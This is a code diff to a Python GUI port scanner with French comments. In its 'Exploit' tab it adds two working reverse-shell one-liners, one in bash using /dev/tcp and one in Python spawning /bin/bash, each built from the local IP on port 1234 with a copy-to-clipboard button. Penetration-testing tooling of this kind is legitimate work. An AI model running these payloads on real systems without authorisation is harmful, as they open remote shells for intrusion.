@@ -5,6 +5,8 @@ import customtkinter as ctk
 import nmap
 import PortScanner
 
+
+
 class GUIApp:
     """Classe responsable de l'interface utilisateur."""
 
@@ -17,7 +19,7 @@ class GUIApp:
         ctk.set_default_color_theme("blue")
         self.app = ctk.CTk()
         self.app.title("Scanner de Ports")
-        self.app.geometry("500x500")
+        self.app.geometry("600x500")
 
         # Menu déroulant pour changer de fenêtre
         self.menu = ctk.CTkOptionMenu(self.app, values=["Scan", "Exploit"], command=self.switch_tab)
@@ -73,6 +75,36 @@ class GUIApp:
         ip_address = self.get_local_ip()
         self.exploit_label = ctk.CTkLabel(self.main_frame, text=f"Votre adresse IP locale : {ip_address}")
         self.exploit_label.pack(pady=20)
+
+        # Reverse Shell Bash Command
+        bash_reverse_shell = f"bash -i >& /dev/tcp/{ip_address}/1234 0>&1"
+        self.bash_label = ctk.CTkLabel(self.main_frame, text="Bash Reverse Shell:")
+        self.bash_label.pack(pady=5)
+        
+        self.bash_cmd_label = ctk.CTkLabel(self.main_frame, text=bash_reverse_shell)
+        self.bash_cmd_label.pack(pady=5)
+
+        self.bash_copy_button = ctk.CTkButton(self.main_frame, text="Copy to Clipboard", command=lambda: self.copy_to_clipboard(bash_reverse_shell))
+        self.bash_copy_button.pack(pady=10)
+
+        # Reverse Shell Python Command
+        python_reverse_shell = f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip_address}\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
+        self.python_label = ctk.CTkLabel(self.main_frame, text="Python Reverse Shell:")
+        self.python_label.pack(pady=5)
+
+        self.python_cmd_label = ctk.CTkLabel(self.main_frame, text=python_reverse_shell)
+        self.python_cmd_label.pack(pady=5)
+        
+
+        self.python_copy_button = ctk.CTkButton(self.main_frame, text="Copy to Clipboard", command=lambda: self.copy_to_clipboard(python_reverse_shell))
+        self.python_copy_button.pack(pady=10)
+
+    def copy_to_clipboard(self, text):
+        """Copy the given text to the clipboard."""
+        self.app.clipboard_clear()
+        self.app.clipboard_append(text)
+        self.app.update()  # Update the clipboard
+
 
     def clear_screen(self):
         """Efface tous les widgets de l'onglet actuel."""
